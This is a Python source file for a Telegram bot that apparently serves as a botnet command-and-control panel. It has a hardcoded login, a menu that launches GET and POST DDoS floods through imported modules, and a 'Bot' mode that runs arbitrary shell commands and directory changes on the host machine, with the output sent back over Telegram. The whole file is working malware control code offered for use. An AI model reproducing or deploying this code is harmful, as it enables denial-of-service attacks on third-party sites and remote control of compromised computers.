import telebot
from getpass import getuser
import os
from dbworker import set_state, get_current_state
from MainDDoS import mainDDoS, GETDDOS1, GETDDOS2, POSTDDOS1, POSTDDOS2, POSTDDOS3
from SecondDDoS import secondDDoS, sGETDDOS1, sGETDDOS2, sPOSTDDOS1, sPOSTDDOS2, sPOSTDDOS3
from CMD import cmd
import config

client = telebot.TeleBot(config.config["token"])

name = getuser()

@client.message_handler(commands=["start"])
def login(message):
    set_state(message.chat.id, config.States.S_LOGIN)
    client.send_message(message.chat.id, 'Enter login and password or "Check"')

@client.message_handler(func=lambda message: get_current_state(message.chat.id) == config.States.S_LOGIN)
def login_in(message):
    if message.text == name + " 16080305":
        client.send_message(message.chat.id, 'Logged in - ' + name + ' as Administrator')
        client.send_message(message.chat.id, "Commands: ")
        client.send_message(message.chat.id, 'DDOS - enter in DDoS panel')
        client.send_message(message.chat.id, 'Check - check new bots')
        client.send_message(message.chat.id, 'Bot name + cmd - command line')
        client.send_message(message.chat.id, 'online - bots online')
        set_state(message.chat.id, config.States.S_LOGINED_A)
    elif message.text == "Check":
        client.send_message(message.chat.id, 'Logged in - ' + name + ' as Bot')
        set_state(message.chat.id, config.States.S_LOGINED_B)
    else:
        client.send_message(message.chat.id, "Wrong password")

@client.message_handler(func=lambda message: get_current_state(message.chat.id) == config.States.S_LOGINED_A)
def logined_in(message):
    if message.text == 'DDOS':
        client.send_message(message.chat.id, 'Choose type of DDoS:')
        client.send_message(message.chat.id, 'GET')
        client.send_message(message.chat.id, 'POST')
        client.send_message(message.chat.id, 'To exit type "Exit"')
        set_state(message.chat.id, config.States.S_DDOS_A)
    elif message.text == 'online':
        client.send_message(message.chat.id, name + ' - is Administrator online')

@client.message_handler(func=lambda message: get_current_state(message.chat.id) == config.States.S_LOGINED_B)
def logined_in(message):
    if message.text == 'DDOS':
        set_state(message.chat.id, config.States.S_DDOS_B)
    elif message.text == 'online':
        client.send_message(message.chat.id, name + ' - is Bot online')
    elif message.text == name + " cmd":
        client.send_message(message.chat.id, 'To exit type "Exit"')
        client.send_message(message.chat.id, cmd('cd'))
        set_state(message.chat.id, config.States.S_CMD_B)

@client.message_handler(func=lambda message: get_current_state(message.chat.id) == config.States.S_CMD_B)
def CMD(message):
    if (message.text != "Exit"):
        if (message.text == 'cd'):
            client.send_message(message.chat.id, "Choose dir which you want to get into")
            set_state(message.chat.id, config.States.S_CMD_CD_B)
        else:
            try:
                client.send_message(message.chat.id, cmd(message.text))
            except:
                client.send_message(message.chat.id, "Error")
    else:
        set_state(message.chat.id, config.States.S_LOGINED_B)

@client.message_handler(func=lambda message: get_current_state(message.chat.id) == config.States.S_CMD_CD_B)
def CMD_CD(message):
    try:
        os.chdir(message.text)
        client.send_message(message.chat.id,"Moving into: " + cmd('cd'))
        set_state(message.chat.id, config.States.S_CMD_B)
    except:
        client.send_message(message.chat.id, "Error")

@client.message_handler(func=lambda message: get_current_state(message.chat.id) == config.States.S_DDOS_A)
def DDoSA(message):
    mainDDoS(message)

@client.message_handler(func=lambda message: get_current_state(message.chat.id) == config.States.S_DDOS_GET1_A)
def GETDDOS1A(message):
    GETDDOS1(message)

@client.message_handler(func=lambda message: get_current_state(message.chat.id) == config.States.S_DDOS_GET2_A)
def GETDDOS2A(message):
    GETDDOS2(message)

@client.message_handler(func=lambda message: get_current_state(message.chat.id) == config.States.S_DDOS_POST1_A)
def POSTDDOS1A(message):
    POSTDDOS1(message)

@client.message_handler(func=lambda message: get_current_state(message.chat.id) == config.States.S_DDOS_POST2_A)
def POSTDDOS2A(message):
    POSTDDOS2(message)

@client.message_handler(func=lambda message: get_current_state(message.chat.id) == config.States.S_DDOS_POST3_A)
def POSTDDOS3A(message):
    POSTDDOS3(message)

@client.message_handler(func=lambda message: get_current_state(message.chat.id) == config.States.S_DDOS_B)
def DDoSB(message):
    secondDDoS(message)

@client.message_handler(func=lambda message: get_current_state(message.chat.id) == config.States.S_DDOS_GET1_B)
def GETDDOS1B(message):
    sGETDDOS1(message)

@client.message_handler(func=lambda message: get_current_state(message.chat.id) == config.States.S_DDOS_GET2_B)
def GETDDOS2B(message):
    sGETDDOS2(message)

@client.message_handler(func=lambda message: get_current_state(message.chat.id) == config.States.S_DDOS_POST1_B)
def POSTDDOS1B(message):
    sPOSTDDOS1(message)

@client.message_handler(func=lambda message: get_current_state(message.chat.id) == config.States.S_DDOS_POST2_B)
def POSTDDOS2B(message):
    sPOSTDDOS2(message)

@client.message_handler(func=lambda message: get_current_state(message.chat.id) == config.States.S_DDOS_POST3_B)
def POSTDDOS3B(message):
    sPOSTDDOS3(message)



client.polling(none_stop = True, interval = 0)